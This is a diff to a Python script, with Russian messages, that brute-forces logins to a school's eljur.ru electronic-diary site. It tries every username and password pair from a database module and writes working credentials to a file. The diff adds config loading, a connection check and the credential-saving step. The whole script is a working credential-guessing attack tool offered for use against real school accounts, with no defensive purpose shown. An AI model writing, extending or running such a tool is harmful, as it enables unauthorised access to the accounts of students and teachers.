@@ -1,12 +1,19 @@
+from ast import For
 from turtle import pos
-from requests import post
-from database import paswords
-from database import usernames
-from colorama import init
-from colorama import Fore, Back, Style
+from requests import post, get
+from database import paswords, usernames
+from colorama import Fore, Back, Style, init
 import time
-
+from config import processes, schooldomain
 init()
+
+def init(processes, schooldomain):
+    print(Fore.YELLOW + 'Подключаюсь к школе...')
+    if get(f'https://{schooldomain}.eljur.ru').status_code == 200:
+        print(Fore.GREEN + 'Подключение к школе прошло успешно! Начинаю подбор...')
+        solve(schooldomain)
+    else: print(Fore.RED + f'Не удалось подключиться к школе {schooldomain}! Проверьте правильность домена в файле config.py!')
+
 def solve(schooldomain):
     for i in paswords:
         for x in usernames:
@@ -20,8 +27,14 @@ def solve(schooldomain):
             if answ is False:
                 print(Fore.RED + f'Пробую - {x}:{i} | Ошибка | {round((time.time() - start_time)*1000)}ms')
             else:
-                print(Fore.GREEN + f'Пробую - {x}:{i} | Данные верны | {round((time.time() - start_time)*1000)}, 5)ms')
-
+                print(Fore.GREEN + f'Пробую - {x}:{i} | Данные верны | {round((time.time() - start_time)*1000)}ms')
+                f = open('truedata', 'w')
+                f.write(f'{x}:{i}')
+    f.close()
 if __name__ == "__main__":
-    schooldomain = input('Введите домен вашей школы. (символы перед .eljure.ru, Например - soch152: ')
-    solve(schooldomain)
+    if schooldomain == '':
+        print(Back.RED, Fore.BLACK + 'Ошибка! Укажите домен школы в файле config.py')
+    elif processes == 0:
+        print(Back.RED, Fore.BLACK + 'Ошибка! Число процессов не может быть равно нулю')
+    else:
+        init(processes, schooldomain)
